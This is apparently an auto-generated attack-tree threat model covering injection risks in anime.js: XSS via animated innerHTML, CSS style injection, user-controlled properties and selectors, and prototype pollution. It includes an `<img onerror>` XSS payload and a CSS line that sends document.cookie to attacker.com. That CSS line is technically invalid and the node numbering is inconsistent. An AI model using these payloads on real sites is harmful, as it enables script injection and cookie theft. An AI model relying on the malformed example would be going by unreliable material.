## Attack Tree Path: [1. Exploit anime.js Vulnerabilities - Parameter Injection Attacks:](./attack_tree_paths/1__exploit_anime_js_vulnerabilities_-_parameter_injection_attacks.md)

*   **1.1.1. Inject Malicious JavaScript via `innerHTML`/`outerHTML`:**
    *   **Attack Vector:** If anime.js (or developer misuse) allows animating properties like `innerHTML` or `outerHTML`, an attacker could inject malicious JavaScript code within animation parameters.
    *   **Mechanism:**
        *   Target an element where `innerHTML` or `outerHTML` is being animated.
        *   Inject a malicious payload containing `<script>` tags or event handlers (e.g., `<img src="x" onerror="maliciousCode()">`) as the value for `innerHTML`/`outerHTML` within the animation definition.
    *   **Impact:** [CRITICAL NODE] Critical (XSS, Full Compromise) [CRITICAL NODE]. Successful execution leads to Cross-Site Scripting, allowing the attacker to execute arbitrary JavaScript code in the user's browser, potentially leading to account takeover, data theft, and full application compromise.

*   **1.1.2. Inject Malicious CSS via `style` Attribute Manipulation:**
    *   **Attack Vector:**  Anime.js is designed to animate CSS `style` properties. An attacker could inject malicious CSS code within animation parameters targeting `style` attributes.
    *   **Mechanism:**
        *   Target an element whose `style` attribute is being animated by anime.js.
        *   Inject malicious CSS code as the value for a `style` property within the animation definition. This could include:
            *   **Data Exfiltration:** Using CSS properties like `background-image: url('http://attacker.com/log?data=' + document.cookie)` to send data to an attacker's server when the style is applied.
            *   **Website Defacement:** Injecting CSS to alter the visual appearance of the website maliciously.
    *   **Impact:** Medium.  Can lead to website defacement and potentially data exfiltration via CSS injection techniques.

## Attack Tree Path: [2. Exploit Developer Misuse of anime.js - Insecure Integration of User Input:](./attack_tree_paths/2__exploit_developer_misuse_of_anime_js_-_insecure_integration_of_user_input.md)

*   **4.1.1. User Input Controls Animated Properties - Inject Malicious Values via User Input Fields:**
    *   **Attack Vector:** Developers might mistakenly use user-provided input directly to define animation properties without proper validation or sanitization.
    *   **Mechanism:**
        *   User input (e.g., from URL parameters, form fields) is directly used to set animation properties in anime.js.
        *   An attacker manipulates this user input to inject malicious values for animation properties. This could potentially lead to unexpected behavior, defacement, or in some cases, information disclosure depending on the animated properties and application logic.
    *   **Impact:** Medium to High.  Depending on the specific properties being animated and the application's context, this could range from minor defacement to more serious information disclosure or functional disruption.

*   **4.1.2. User Input Controls Animation Targets (Selectors) - User Input Can Target Sensitive Elements for Animation:**
    *   **Attack Vector:** This is the most critical developer misuse scenario. If user input is used to construct CSS selectors that determine which elements anime.js animates, it creates a severe vulnerability.
    *   **Mechanism:**
        *   User input is used to dynamically build CSS selectors that are then passed to anime.js to target elements for animation.
        *   An attacker crafts malicious user input to create selectors that target sensitive or unintended DOM elements.
        *   By controlling the animation targets, the attacker can manipulate any element on the page, potentially leading to DOM-based XSS, defacement, or data theft.
    *   **Impact:** [CRITICAL NODE] Critical (DOM-based XSS, Full Compromise, Data Theft) [CRITICAL NODE]. This is a highly critical vulnerability as it can allow for full DOM-based Cross-Site Scripting, enabling attackers to completely control the page content and user interactions, leading to severe consequences.

*   **1.3. Prototype Pollution - Inject Malicious Payload to Modify JavaScript Prototype Chain & Impact Application Logic or Security:**
    *   **Attack Vector:**  If anime.js has a vulnerability in its parameter handling, an attacker might attempt to inject a payload that modifies the JavaScript prototype chain.
    *   **Mechanism:**
        *   Exploit a potential vulnerability in how anime.js processes animation parameters.
        *   Inject a specially crafted payload within animation parameters designed to modify JavaScript prototypes (e.g., using `__proto__` or `constructor.prototype`).
        *   Successful prototype pollution can alter the behavior of JavaScript objects throughout the application.
    *   **Impact:** [CRITICAL NODE] Critical (Application-wide compromise, unpredictable behavior) [CRITICAL NODE]. Prototype pollution can have widespread and unpredictable consequences, potentially compromising the entire application logic and security mechanisms.
